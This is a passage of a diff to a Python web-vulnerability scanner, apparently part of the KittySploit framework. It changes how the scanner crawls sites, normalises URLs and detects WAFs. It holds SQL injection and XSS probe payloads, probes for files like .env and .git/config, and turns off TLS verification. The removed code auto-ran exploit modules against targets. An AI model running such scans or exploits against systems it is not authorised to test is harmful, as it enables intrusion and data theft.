+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+            }
+        )
         if cookie:
-            self.session.headers.update({'Cookie': cookie})
-        
-        self.timeout = timeout
-        self.crawl_delay = max(0.0, crawl_delay)
+            self.session.headers["Cookie"] = cookie
 
-    def _detect_waf(self, url):
-        """Detect WAF presence by sending suspicious payloads"""
-        try:
-            # Baseline request
-            base_resp = self._get_page(url)
-            if not base_resp:
-                return
-            
-            # 1. Check headers in baseline
-            for header, value in base_resp['headers'].items():
-                for waf, sigs in WAF_SIGNATURES.items():
-                    if any(sig in header.lower() or sig in value.lower() for sig in sigs):
-                        self.waf_detected = waf
-                        return
+    def _normalize_target(self, raw_url: str) -> Tuple[str, str]:
+        value = (raw_url or "").strip()
+        if not value:
+            raise ValueError("Empty target URL")
+        if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", value):
+            value = f"http://{value}"
+        parsed = urlparse(value)
+        if not parsed.netloc:
+            raise ValueError(f"Invalid target URL: {raw_url}")
 
-            # 2. Provocation request (mild SQLi)
-            provocation_url = f"{url}?id=1%20UNION%20SELECT%201,2,3--&test=<script>alert(1)</script>"
-            try:
-                resp = self.session.get(provocation_url, timeout=self.timeout)
-                # Check status codes common for WAFs
-                if resp.status_code in [403, 406, 501, 999]:
-                    for waf, sigs in WAF_SIGNATURES.items():
-                        if any(sig in resp.text.lower() for sig in sigs):
-                            self.waf_detected = waf
-                            return
-                    self.waf_detected = "Generic/Unknown WAF"
-                
-                # Check headers in provocation response
-                for header, value in resp.headers.items():
-                    for waf, sigs in WAF_SIGNATURES.items():
-                        if any(sig in header.lower() or sig in value.lower() for sig in sigs):
-                            self.waf_detected = waf
-                            return
-            except Exception:
-                pass
-                
-        except Exception as e:
-            if self.verbose:
-                print_warning(f"WAF detection error: {e}")
+        scheme = (parsed.scheme or "http").lower()
+        path = self._normalize_path(parsed.path)
+        query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
+        normalized = urlunparse((scheme, parsed.netloc, path, "", query, ""))
+        base_url = f"{scheme}://{parsed.netloc}"
+        return normalized, base_url
 
-    def _crawl_website(self, start_url: str, max_depth: int):
-        """Crawl website and collect URLs (parallelized)"""
-        visited = set()
-        visited_lock = Lock()
-        to_visit = deque([(start_url, 0)])
-        to_visit_lock = Lock()
-        base_netloc = urlparse(self.base_url).netloc
-        
-        static_exts = {'.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf', '.pdf'}
-        
-        def crawl_worker():
-            while not self.stop_flag.is_set():
-                url_data = None
-                with to_visit_lock:
-                    if to_visit:
-                        url_data = to_visit.popleft()
-                
-                if not url_data:
-                    break
-                
-                current_url, depth = url_data
-                
-                with visited_lock:
-                    if current_url in visited:
-                        continue
-                    visited.add(current_url)
-                    self.crawled_urls.add(current_url)
-                
-                if depth >= max_depth:
-                    continue
-                
-                try:
-                    page = self._get_page(current_url)
-                    if not page or page['status_code'] != 200:
-                        continue
-                        
-                    # Parse HTML
-                    soup = self._get_cached_soup(current_url, page['text'])
-                    new_links = set()
-                    
-                    # <a> tags
-                    for link in soup.find_all('a', href=True):
-                        new_links.add(link['href'])
-                    
-                    # <form> actions
-                    for form in soup.find_all('form', action=True):
-                        new_links.add(form['action'])
-                    
-                    for raw_link in new_links:
-                        # Clean and join
-                        abs_link = urljoin(current_url, raw_link)
-                        parsed = urlparse(abs_link)
-                        
-                        # Filter out external domains
-                        if parsed.netloc and parsed.netloc != base_netloc:
-                            continue
-                            
-                        # Filter out static assets
-                        path_lower = parsed.path.lower()
-                        if any(path_lower.endswith(ext) for ext in static_exts):
-                            continue
-                        
-                        # Filter out mailto/tel
-                        if parsed.scheme in ['mailto', 'tel', 'javascript']:
-                            continue
-                            
-                        # Add to queue
-                        with visited_lock:
-                            if abs_link not in visited:
-                                with to_visit_lock:
-                                    to_visit.append((abs_link, depth + 1))
-                                    
-                except Exception as e:
-                    if self.verbose:
-                        print_warning(f"Crawl error on {current_url}: {e}")
-        
-        # Start crawl threads
-        num_workers = min(10, self.max_modules * 2)
-        with ThreadPoolExecutor(max_workers=num_workers) as executor:
-            futures = [executor.submit(crawl_worker) for _ in range(num_workers)]
-            for future in as_completed(futures):
-                pass
-    
-    def _analyze_urls(self) -> List[Dict]:
-        """Analyze URLs and extract parameters"""
-        url_data = []
-        
-        for url in self.crawled_urls:
-            parsed = urlparse(url)
-            params = parse_qs(parsed.query)
-            path_params = self._extract_path_params(parsed.path)
-            form_data = self._extract_form_data(url)
-            js_endpoints = self._extract_js_endpoints(url)
-            
-            # Check for interesting extensions
-            ext = os.path.splitext(parsed.path)[1].lower()
-            is_interesting = ext in ['.php', '.jsp', '.asp', '.aspx', '.cgi', '.pl', '']
-            
-            url_entry = {
-                'url': url,
-                'path': parsed.path,
-                'query_params': params,
-                'path_params': path_params,
-                'form_data': form_data,
-                'js_endpoints': js_endpoints,
-                'method': 'POST' if form_data else 'GET',
-                'signals': set(),
-                'has_params': bool(params or path_params or form_data)
-            }
-            if is_interesting or url_entry['has_params']:
-                url_data.append(url_entry)
-        
-        # Sort by importance (has_params first)
-        url_data.sort(key=lambda x: (not x['has_params'], x['url']))
-        return url_data
+    def _normalize_path(self, path: str) -> str:
+        if not path:
+            return "/"
+        raw = path if path.startswith("/") else f"/{path}"
+        trailing = raw.endswith("/")
+        normalized = posixpath.normpath(raw)
+        if normalized in ("", "."):
+            normalized = "/"
+        if trailing and normalized != "/" and not normalized.endswith("/"):
+            normalized = f"{normalized}/"
+        return normalized
 
-    def _extract_path_params(self, path: str) -> List[str]:
-        """Extract potential path parameters"""
-        params = []
-        if not path or path == '/': return params
-        
-        # Numeric ID
-        params.extend(re.findall(r'/\d+', path))
-        # UUID
-        params.extend(re.findall(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', path, re.I))
-        
-        # API style segments
-        segments = [s for s in path.split('/') if s]
-        if len(segments) >= 2:
-            if segments[-1].isdigit() or len(segments[-1]) > 10:
-                params.append(f"/{segments[-1]}")
-        return params
-
-    def _extract_form_data(self, url: str) -> Dict:
-        """Extract inputs from forms"""
-        try:
-            page = self._get_page(url)
-            if not page or page['status_code'] != 200: return {}
-            
-            soup = self._get_cached_soup(url, page['text'])
-            data = {}
-            for form in soup.find_all('form'):
-                for inp in form.find_all(['input', 'textarea', 'select']):
-                    name = inp.get('name')
-                    if not name: continue
-                    value = inp.get('value', '')
-                    # Fuzz string if empty
-                    if not value:
-                        value = 'test'
-                    data[name] = value
-            return data
-        except Exception:
-            return {}
-
-    def _extract_js_endpoints(self, url: str) -> List[str]:
-        """Extract API endpoints from JS"""
-        endpoints = []
-        try:
-            page = self._get_page(url)
-            if not page: return []
-            text = page.get('text', '')
-            
-            # Regex for paths inside quotes
-            # Looks for strings starting with / or http, ending with typical API extensions or just generic paths
-            potential_paths = re.findall(r'["\']((?:https?://|/)[a-zA-Z0-9_/.-]+)["\']', text)
-            
-            base_netloc = urlparse(url).netloc
-            for p in potential_paths:
-                full = urljoin(url, p)
-                if urlparse(full).netloc == base_netloc:
-                    endpoints.append(full)
-            return list(set(endpoints))
-        except:
-            return []
-
-    def _discover_common_files(self):
-        """Active discovery of common sensitive files if not found by crawler"""
-        common_paths = [
-            'robots.txt', 'sitemap.xml', '.git/config', '.env', 'phpinfo.php', 
-            'config.php', 'wp-config.php', '.htaccess', 'backup.zip', 'backup.sql',
-            'admin/', 'login/', 'api/v1/', 'assets/', 'uploads/'
-        ]
-        
-        # We target the base URL
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(self._get_page, urljoin(self.base_url, path)): path for path in common_paths}
-            for future in as_completed(futures):
-                path = futures[future]
-                try:
-                    resp = future.result()
-                    # 200 is a hit, 403 is also interesting (indicates existence)
-                    if resp and resp['status_code'] in [200, 403]:
-                        full_url = urljoin(self.base_url, path)
-                        if full_url not in self.crawled_urls:
-                            if self.verbose: print_info(f"  [+] Discovered: {path} ({resp['status_code']})")
-                            self.crawled_urls.add(full_url)
-                except:
-                    pass
-
-    def _detect_technologies(self):
-        """Detect technologies using headers and content with tokenization"""
-        # We only check a subset of URLs to save time
-        check_urls = list(self.crawled_urls)[:15]
-        if not check_urls: return
-        
-        # Common tech keywords to look for
-        known_keywords = {
-            'nginx', 'apache', 'php', 'wordpress', 'drupal', 'joomla', 'laravel', 
-            'django', 'tomcat', 'iis', 'express', 'node', 'fastapi', 'flask', 
-            'ubuntu', 'debian', 'centos', 'redhat', 'windows', 'asp.net', 'jsp'
-        }
-
-        for url in check_urls:
-            page = self._get_page(url)
-            if not page: continue
-            
-            headers = page['headers']
-            text = (page['text'] or "").lower()
-            
-            # 1. Header Analysis (Tokenize Server and X-Powered-By)
-            for header in ['Server', 'X-Powered-By', 'Via', 'X-AspNet-Version']:
-                if header in headers:
-                    val = headers[header]
-                    self.technologies[val].append(url)
-                    # Tokenize
-                    tokens = re.split(r'[^a-zA-Z0-9.-]', val.lower())
-                    for token in tokens:
-                        if len(token) > 1:
-                            if token in known_keywords or any(k in token for k in known_keywords):
-                                self.tech_tokens.add(token)
-
-            # 2. Content Analysis (Heuristics)
-            heuristics = {
-                'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
-                'Drupal': ['drupal.js', 'sites/all', 'drupal settings'],
-                'Joomla': ['joomla!', 'option=com_', '/media/system/js/'],
-                'Laravel': ['laravel_session', 'x-csrf-token'],
-                'Django': ['csrftoken', '__admin__', 'django'],
-                'PHP': ['phpinfo', '.php', 'powered by php'],
-                'Tomcat': ['jsessionid', 'apache tomcat'],
-                'Express': ['x-powered-by: express'],
-                'FastAPI': ['fastapi', 'openapi.json'],
-                'React': ['react-root', '__react'],
-            }
-
-            for tech, sigs in heuristics.items():
-                if any(sig in text for sig in sigs):
-                    self.technologies[tech].append(url)
-                    self.tech_tokens.add(tech.lower())
-                    
-        # Add basic OS tokens if found in server string
-        if 'ubuntu' in self.tech_tokens: self.tech_tokens.add('linux')
-        if 'win' in self.tech_tokens: self.tech_tokens.add('windows')
-
-    def _active_exploit(self, url_data: List[Dict]) -> int:
-        """Active verification of parameters"""
-        if not url_data: return 0
-        confirmed_count = 0
-        
-        # Limit the number of URLs to actively exploit to prevent timeouts
-        target_urls = url_data[:20] if not self.aggressive else url_data 
-        
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = [executor.submit(self._test_url_entry, entry) for entry in target_urls]
-            for future in as_completed(futures):
-                try:
-                    confirmed_count += future.result()
-                except Exception as e:
-                    if self.verbose: print_warning(f"Active exploit thread error: {e}")
-        return confirmed_count
-
-    def _test_url_entry(self, entry: Dict) -> int:
-        """Test a single URL for all injections"""
-        url = self._clean_url(entry['url'])
-        params = self._flatten_params(entry.get('query_params', {}))
-        form_data = dict(entry.get('form_data', {}))
-        count = 0
-        
-        if params:
-            count += self._fuzz_params(url, params, 'GET', entry)
-        if form_data:
-            count += self._fuzz_params(url, form_data, 'POST', entry)
-            
-        return count
-
-    def _fuzz_params(self, url, params, method, entry):
-        """Fuzz a set of parameters"""
-        hits = 0
-        for param, orig_val in params.items():
-            # Skip uninteresting params unless aggressive
-            if not self.aggressive and param.lower() in ['lang', 'language', 'submit']:
-                continue
-                
-            # Heuristic: Determine likely vulnerability type
-            ptype = self._infer_param_type(param)
-            
-            # Test based on type + generic
-            if ptype == 'sqli' or ptype == 'unknown':
-                hits += self._test_sqli(url, params, param, method, entry)
-            if ptype == 'xss' or ptype == 'unknown':
-                hits += self._test_xss(url, params, param, method, entry)
-            if ptype == 'rce' or ptype == 'unknown':
-                hits += self._test_rce(url, params, param, method, entry)
-            if ptype == 'lfi' or ptype == 'unknown':
-                hits += self._test_lfi(url, params, param, method, entry)
-            if ptype == 'ssrf' or ptype == 'unknown':
-                hits += self._test_ssrf(url, params, param, method, entry)
-                
-        return hits
-
-    def _infer_param_type(self, param: str) -> str:
-        p = param.lower()
-        if any(x in p for x in ['id', 'user', 'num', 'account', 'query']): return 'sqli'
-        if any(x in p for x in ['search', 'q', 'comment', 'msg', 'name']): return 'xss'
-        if any(x in p for x in ['cmd', 'exec', 'ping', 'dir', 'shell']): return 'rce'
-        if any(x in p for x in ['file', 'path', 'doc', 'folder', 'include']): return 'lfi'
-        if any(x in p for x in ['url', 'uri', 'site', 'host', 'dest']): return 'ssrf'
-        return 'unknown'
-
-    def _test_url_entry(self, entry: Dict) -> int:
-        """Test a single URL using appropriate KittySploit modules"""
-        url = self._clean_url(entry['url'])
-        params = self._flatten_params(entry.get('query_params', {}))
-        form_data = dict(entry.get('form_data', {}))
-        
-        count = 0
+    def _canonicalize_url(self, url: str) -> str:
         parsed = urlparse(url)
-        base_target = f"{parsed.scheme}://{parsed.netloc}"
-        
-        # Determine likely vulnerabilities based on parameters
-        for param in chain(params.keys(), form_data.keys()):
-            ptype = self._infer_param_type(param)
-            method = 'GET' if param in params else 'POST'
-            
-            # Map vulnerability types to KittySploit scanner modules
-            # We use the auxiliary/scanner/http modules instead of redundant code
-            vuln_modules = {
-                'sqli': 'auxiliary/scanner/http/sql_injection',
-                'xss': 'auxiliary/scanner/http/xss_scanner',
-                'lfi': 'auxiliary/scanner/http/lfi_fuzzer',
-                'ssrf': 'auxiliary/scanner/http/ssrf_scanner',
-                'xxe': 'auxiliary/scanner/http/xxe_scanner'
-            }
-            
-            # If we identified a likely type, prioritze that module
-            module_path = vuln_modules.get(ptype)
-            
-            # Otherwise, if we are in aggressive mode or it's 'unknown', 
-            # we might want to test everything (handled by the loop)
-            types_to_test = [ptype] if ptype != 'unknown' else vuln_modules.keys()
-            
-            for t in types_to_test:
-                mod_path = vuln_modules.get(t)
-                if not mod_path: continue
-                
-                # Run the module
-                if self._run_generic_scanner(mod_path, base_target, parsed.path, param, method, entry):
-                    count += 1
-                    entry['signals'].add(t)
-                    # If we found a hit, maybe stop testing other types for this param?
-                    if not self.aggressive: break
-                    
-        return count
+        if parsed.scheme not in {"http", "https"}:
+            return ""
+        path = self._normalize_path(parsed.path)
+        query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
+        return urlunparse((parsed.scheme.lower(), parsed.netloc, path, "", query, ""))
 
-    def _run_generic_scanner(self, mod_path, target, path, parameter, method, entry):
-        """Helper to run a generic KittySploit scanner module with specific parameters"""
-        try:
-            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
-            if not module: return False
-            
-            # Universal configuration
-            self._set_vals(module, 'RHOSTS', urlparse(target).hostname)
-            self._set_vals(module, 'TARGET', target)
-            self._set_vals(module, 'PATH', path)
-            self._set_vals(module, 'PARAMETER', parameter)
-            self._set_vals(module, 'METHOD', method)
-            
-            # Specific options for some modules
-            if 'lfi_fuzzer' in mod_path:
-                # lfi_fuzzer uses 'target' as full URL with parameter
-                full_url = f"{target}{path}?{parameter}=" if method == 'GET' else f"{target}{path}"
-                self._set_vals(module, 'target', full_url)
-                self._set_vals(module, 'parameter', parameter)
+    def _same_origin(self, url: str) -> bool:
+        parsed = urlparse(url)
+        return bool(parsed.netloc) and parsed.netloc == self.target_parts.netloc
 
-            # Execute check or run
-            if hasattr(module, 'check'):
-                res = module.check()
-                if self._check_is_vuln(res):
-                    vuln_name = mod_path.split('/')[-1].replace('_', ' ').title()
-                    self._record_result(
-                        url=f"{target}{path}", 
-                        attack=vuln_name, 
-                        parameter=parameter, 
-                        evidence=f"Confirmed by {mod_path}", 
-                        method=method
-                    )
-                    return True
-            
-            # Some modules only have run()
-            if hasattr(module, 'run'):
-                # Redirect output? No, let it print or capture results if module supports it
-                # For now, we assume if run() completes and we can verify state...
-                # Ideally scanners return a boolean or a list of found vulns.
-                # auxiliary/scanner/http/sql_injection returns True if vulnerable.
-                res = module.run()
-                if res:
-                    vuln_name = mod_path.split('/')[-1].replace('_', ' ').title()
-                    self._record_result(
-                        url=f"{target}{path}", 
-                        attack=vuln_name, 
-                        parameter=parameter, 
-                        evidence=f"Detected by module execution: {mod_path}", 
-                        method=method
-                    )
-                    return True
-            
+    def _should_visit_url(self, url: str) -> bool:
+        if not url:
             return False
-        except Exception as e:
-            if self.verbose: 
-                print_debug(f"Error running generic scanner {mod_path}: {e}")
+        parsed = urlparse(url)
+        if parsed.scheme not in {"http", "https"}:
             return False
-
-    def _test_sqli(self, *args, **kwargs):
-        # Deprecated: usage moved to _run_generic_scanner
-        return 0
-
-    def _test_xss(self, *args, **kwargs):
-        # Deprecated: usage moved to _run_generic_scanner
-        return 0
-
-    def _test_rce(self, *args, **kwargs):
-        # Deprecated: usage moved to _run_generic_scanner
-        return 0
-
-    def _test_lfi(self, *args, **kwargs):
-        # Deprecated: usage moved to _run_generic_scanner
-        return 0
-
-    def _test_ssrf(self, *args, **kwargs):
-        # Deprecated: usage moved to _run_generic_scanner
-        return 0
-
-    def _request(self, url, method, params, timeout=None) -> Optional[requests.Response]:
-        t = timeout or self.timeout
-        try:
-            if method == 'POST':
-                return self.session.post(url, data=params, timeout=t)
-            return self.session.get(url, params=params, timeout=t)
-        except:
-            return None
-
-    def _find_modules(self, patterns: List[str], url_data: List[Dict]) -> List[Dict]:
-        """Smart Module Selection Strategy using tokenized strings"""
-        if not self.framework: return []
-        
-        candidates = []
-        
-        # 1. Identify signals from passive/active analysis
-        vuln_signals = set()
-        for u in url_data:
-            vuln_signals.update(u.get('signals', []))
-        
-        # 2. Scan all modules
-        all_modules = self._list_all_exploit_modules()
-        
-        for mod_path in all_modules:
-            score = 0
-            mod_parts = re.split(r'[^a-zA-Z0-9]', mod_path.lower())
-            mod_parts = [p for p in mod_parts if len(p) > 2]
-            mod_lower = mod_path.lower()
-            
-            # Base score if matches user pattern
-            if 'all' in patterns:
-                score += 1
-            elif any(pat in mod_lower for pat in patterns):
-                score += 20
-            
-            if score == 0: continue
-            
-            # Technology Boost (using tokens)
-            # e.g. if mod_path is 'exploits/linux/http/apache_rce' and tech_tokens has 'apache'
-            for tech in self.tech_tokens:
-                if tech in mod_parts or tech in mod_lower:
-                    score += 30 # Significant match
-            
-            # Vulnerability Type Boost
-            for signal in vuln_signals:
-                if signal in mod_parts or signal in mod_lower:
-                    score += 25
-            
-            # Context boost (HTTP modules have priority for web scan)
-            if 'http' in mod_lower:
-                score += 10
-
-            if score > 10:
-                candidates.append({'path': mod_path, 'score': score})
-                
-        # Sort
-        candidates.sort(key=lambda x: x['score'], reverse=True)
-        return candidates[:50] # Return top 50 matches
-
-    def _list_all_exploit_modules(self) -> List[str]:
-        """Traverse filesystem to find modules"""
-        modules = []
-        # Support both 'exploits' and 'auxiliary'
-        module_types = ['exploits', 'auxiliary']
-        
-        for m_type in module_types:
-            base_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'modules', m_type)
-            if not os.path.exists(base_dir): continue
-            
-            for root, _, files in os.walk(base_dir):
-                for file in files:
-                    if file.endswith('.py') and not file.startswith('__'):
-                        # Calculate relative path from 'modules/'
-                        full_path = os.path.join(root, file)
-                        modules_root = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'modules')
-                        rel = os.path.relpath(full_path, modules_root)
-                        mod_name = rel.replace('\\', '/').replace('.py', '')
-                        modules.append(mod_name)
-        return modules
-
-    def _test_vulnerabilities(self, url_data, modules, threads):
-        """Run selected modules against targets"""
-        # Group modules by relevance to avoid spamming every URL with every module
-        tasks = []
-        
-        # Limit to top scoring modules to keep it efficient
-        top_modules = modules[:20]
-        
-        for mod in top_modules:
-            mod_path = mod['path']
-            # Only test modules that aren't the ones we already used in _test_url_entry
-            if 'scanner/http/' in mod_path: continue
-            
-            for url_entry in url_data:
-                # check relevance
-                if not self._is_module_relevant(mod_path, url_entry):
-                    continue
-                
-                tasks.append((mod_path, url_entry))
-        
-        if not tasks:
-            return
-
-        print_info(f"Generated {len(tasks)} exploit/auxiliary tasks.")
-        
-        # Parallel execution logic
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(self._run_single_module, mod_path, url_entry) for mod_path, url_entry in tasks]
-            for future in as_completed(futures):
-                pass
-
-    def _is_module_relevant(self, mod_path: str, url_entry: Dict) -> bool:
-        """Check if module is relevant for URL"""
-        mp = mod_path.lower()
-        u = url_entry['url'].lower()
-        
-        # Tech heuristics
-        techs = [t.lower() for t in self.technologies.keys()]
-        
-        # If tech is known, filter modules by tech
-        if techs:
-            # If module name contains a tech that is NOT in the target's techs, return False
-            known_tech_keywords = ['wordpress', 'joomla', 'drupal', 'laravel', 'django', 'php', 'tomcat', 'nginx', 'apache', 'iis']
-            for tech in known_tech_keywords:
-                if tech in mp and tech not in techs:
-                    return False
-
-        # Pattern heuristics
-        if 'wordpress' in mp and 'wp-' not in u: return False
-        if 'joomla' in mp and 'com_content' not in u: return False
-        
+        if parsed.netloc and not self._same_origin(url):
+            return False
+        if any(keyword in parsed.path.lower() for keyword in DESTRUCTIVE_PATH_KEYWORDS) and not self.aggressive:
+            return False
+        ext = os.path.splitext(parsed.path.lower())[1]
+        if ext in STATIC_EXTENSIONS:
+            return False
         return True
 
-    def _run_single_module(self, mod_path, url_entry):
+    def _get_page(self, url: str, use_cache: bool = True) -> Optional[Dict[str, Any]]:
+        if use_cache:
+            with self.cache_lock:
+                cached = self.page_cache.get(url)
+            if cached:
+                return cached
+
         try:
-            # Load module
-            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
-            if not module: return
-            
-            parsed = urlparse(url_entry['url'])
-            # Configure
-            self._set_vals(module, 'RHOSTS', parsed.hostname)
-            self._set_vals(module, 'RPORT', parsed.port or (443 if parsed.scheme=='https' else 80))
-            self._set_vals(module, 'SSL', parsed.scheme=='https')
-            self._set_vals(module, 'TARGETURI', parsed.path or '/')
-            
-            # Some modules use 'TARGET' or 'RHOST'
-            self._set_vals(module, 'TARGET', f"{parsed.scheme}://{parsed.netloc}")
-            self._set_vals(module, 'RHOST', parsed.hostname)
-
-            # Check
-            if hasattr(module, 'check'):
-                res = module.check()
-                if self._check_is_vuln(res):
-                    self._record_result(url=url_entry['url'], module=mod_path, status="Vulnerable (Check)", message=str(res))
-                    # Exploit?
-                    if self.aggressive and hasattr(module, 'run'):
-                        module.run()
-            elif hasattr(module, 'run'):
-                # Modules with only run() are more dangerous to run blindly
-                # only run if aggressive or if score was very high
-                if self.aggressive:
-                    module.run()
-        except:
-            pass
-
-    def _set_vals(self, mod, opt, val):
-        """Safely set option values on a module"""
-        if hasattr(mod, opt):
-            try:
-                # Try setting the .value property (for OptString, etc.)
-                opt_obj = getattr(mod, opt)
-                if hasattr(opt_obj, 'value'):
-                    opt_obj.value = val
-                else:
-                    # Fallback for descriptors or simple attributes
-                    setattr(mod, opt, val)
-            except:
-                # Final fallback
-                setattr(mod, opt, val)
-
-    def _check_is_vuln(self, res):
-        if isinstance(res, bool): return res
-        if isinstance(res, dict): return res.get('vulnerable', False)
-        if hasattr(res, 'vulnerable'): return res.vulnerable
-        return False
-
-    def _flatten_params(self, params):
-        return {k: v[0] if isinstance(v, list) and v else v for k, v in params.items()}
-
-    def _clean_url(self, url):
-        p = urlparse(url)
-        return f"{p.scheme}://{p.netloc}{p.path}"
-
-    def _get_page(self, url):
-        return self._get_page_cached(url)
-
-    def _get_page_cached(self, url):
-        with self.cache_lock:
-            if url in self.page_cache: return self.page_cache[url]
-        try:
-            r = self.session.get(url, timeout=self.timeout, verify=False)
-            ret = {'status_code': r.status_code, 'text': r.text, 'headers': r.headers}
-            with self.cache_lock: self.page_cache[url] = ret
-            return ret
-        except:
+            response = self.session.get(
+                url,
+                timeout=self.timeout,
+                allow_redirects=True,
+                verify=False,
+            )
+            page = {
+                "status_code": response.status_code,
+                "text": response.text or "",
+                "headers": dict(response.headers or {}),
+                "content_type": response.headers.get("Content-Type", ""),
+                "final_url": response.url,
+            }
+            if use_cache:
+                with self.cache_lock:
+                    if len(self.page_cache) < self.max_urls * 4:
+                        self.page_cache[url] = page
+            return page
+        except Exception as exc:
+            self._verbose(f"GET failed for {url}: {exc}")
             return None
 
-    def _get_cached_soup(self, url, text):
-        return BeautifulSoup(text, 'html.parser')
+    def _looks_like_xml(self, url: str, text: str, content_type: str = "") -> bool:
+        lowered_type = (content_type or "").lower()
+        lowered_url = (url or "").lower()
+        stripped = (text or "").lstrip()
+        if "xml" in lowered_type or lowered_url.endswith(".xml"):
+            return True
+        return stripped.startswith("<?xml") or stripped.startswith("<urlset") or stripped.startswith("<sitemapindex")
 
-    def _record_result(self, **kwargs):
-        kwargs['timestamp'] = time.time()
-        with self.results_lock:
-            self.results.append(kwargs)
-        # Real-time output
-        if kwargs.get('module'):
-            print_success(f"[VULN] {kwargs.get('module')} - {kwargs.get('url')}")
+    def _get_soup(self, url: str, text: str, content_type: str = ""):
+        with self.cache_lock:
+            cached = self.soup_cache.get(url)
+        if cached is not None:
+            return cached
+
+        parser = "xml" if self._looks_like_xml(url, text, content_type) else "html.parser"
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore", XMLParsedAsHTMLWarning)
+            try:
+                soup = BeautifulSoup(text or "", parser)
+            except FeatureNotFound:
+                soup = BeautifulSoup(text or "", "html.parser")
+
+        with self.cache_lock:
+            if len(self.soup_cache) < self.max_urls * 4:
+                self.soup_cache[url] = soup
+        return soup
+
+    def _detect_waf(self, url: str):
+        page = self._get_page(url, use_cache=False)
+        if not page:
+            return
+
+        for header, value in page["headers"].items():
+            head = str(header).lower()
+            val = str(value).lower()
+            for waf, markers in WAF_SIGNATURES.items():
+                if any(marker in head or marker in val for marker in markers):
+                    self.waf_detected = waf
+                    return
+
+        probe_url = f"{url}?id=1%27%20OR%20%271%27=%271&xss=%3Csvg/onload=alert(1)%3E"
+        probe = self._get_page(probe_url, use_cache=False)
+        if not probe:
+            return
+        if probe["status_code"] in {403, 406, 429, 501, 999}:
+            probe_text = probe["text"].lower()
+            for waf, markers in WAF_SIGNATURES.items():
+                if any(marker in probe_text for marker in markers):
+                    self.waf_detected = waf
+                    return
+            self.waf_detected = "Generic/Unknown WAF"
+
+    def _crawl_website(self, start_url: str, max_depth: int):
+        queue = deque([(start_url, 0)])
+        visited = set()
+
+        while queue and len(self.crawled_urls) < self.max_urls:
+            current_url, depth = queue.popleft()
+            current_url = self._canonicalize_url(current_url)
+            if not current_url or current_url in visited or not self._should_visit_url(current_url):
+                continue
+
+            visited.add(current_url)
+            self.crawled_urls.add(current_url)
+            self._verbose(f"Crawling depth={depth}: {current_url}")
+
+            if depth >= max_depth:
+                continue
+
+            page = self._get_page(current_url)
+            if not page or page["status_code"] not in {200, 401, 403}:
+                continue
+
+            for candidate in self._extract_candidate_links(
+                current_url,
+                page["text"],
+                page.get("content_type", ""),
+            ):
+                if len(self.crawled_urls) + len(queue) >= self.max_urls:
+                    break
+                if candidate not in visited:
+                    queue.append((candidate, depth + 1))
+
+            if self.crawl_delay:
+                time.sleep(self.crawl_delay)
+
+    def _extract_candidate_links(self, current_url: str, text: str, content_type: str = "") -> Set[str]:
+        candidates = set()
+        soup = self._get_soup(current_url, text, content_type)
+        is_xml = self._looks_like_xml(current_url, text, content_type)
+
+        if is_xml:
+            for node in soup.find_all(["loc", "link"]):
+                raw = node.get_text(strip=True)
+                if not raw:
+                    continue
+                absolute = urljoin(current_url, raw)
+                normalized = self._canonicalize_url(absolute)
+                if normalized and self._should_visit_url(normalized):
+                    candidates.add(normalized)
+
+        for tag in soup.find_all(["a", "form", "iframe", "link", "script"]):
+            attr = "href"
+            if tag.name == "form":
+                attr = "action"
+            elif tag.name in {"iframe", "script"}:
+                attr = "src"
+
+            raw = tag.get(attr)
+            if not raw:
+                continue
+            absolute = urljoin(current_url, raw)
+            normalized = self._canonicalize_url(absolute)
+            if normalized and self._should_visit_url(normalized):
+                candidates.add(normalized)
+
+        text_candidates = re.findall(r"""["']((?:https?://|/)[^"'<>]{1,220})["']""", text or "")
+        for raw in text_candidates:
+            absolute = urljoin(current_url, raw)
+            normalized = self._canonicalize_url(absolute)
+            if normalized and self._should_visit_url(normalized):
+                candidates.add(normalized)
+
+        raw_urls = re.findall(r"""https?://[^\s<>"']+""", text or "")
+        for raw in raw_urls:
+            normalized = self._canonicalize_url(raw.rstrip(".,);"))
+            if normalized and self._should_visit_url(normalized):
+                candidates.add(normalized)
+
+        return candidates
+
+    def _discovery_roots(self) -> List[str]:
+        roots = {self.base_url}
+        if self.target_parts and self.target_parts.path not in {"", "/"}:
+            trimmed = self.target_parts.path.rsplit("/", 1)[0]
+            if not trimmed:
+                trimmed = "/"
+            if not trimmed.endswith("/"):
+                trimmed = f"{trimmed}/"
+            roots.add(f"{self.base_url}{trimmed}")
+        return sorted(roots)
+
+    def _discover_common_files(self):
+        roots = self._discovery_roots()
+        probes = []
+        for root in roots:
+            for path in COMMON_DISCOVERY_PATHS:
+                probes.append(urljoin(root, path))
+
+        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
+            futures = {executor.submit(self._get_page, probe, False): probe for probe in probes}
+            for future in as_completed(futures):
+                probe = futures[future]
+                try:
+                    page = future.result()
+                except Exception:
+                    continue
+                if not page or page["status_code"] not in {200, 401, 403}:
+                    continue
+                normalized = self._canonicalize_url(probe)
+                if normalized and normalized not in self.crawled_urls:
+                    self.crawled_urls.add(normalized)
+                    self._verbose(f"Discovered interesting path: {normalized} ({page['status_code']})")
+
+    def _discover_robots_paths(self):
+        robots_url = urljoin(self.base_url, "robots.txt")
+        page = self._get_page(robots_url)
+        if not page or page["status_code"] != 200 or not page["text"]:
+            return
+
+        for line in page["text"].splitlines():
+            match = re.match(r"^\s*(?:Disallow|Allow)\s*:\s*(/\S+)", line, re.I)
+            if not match:
+                continue
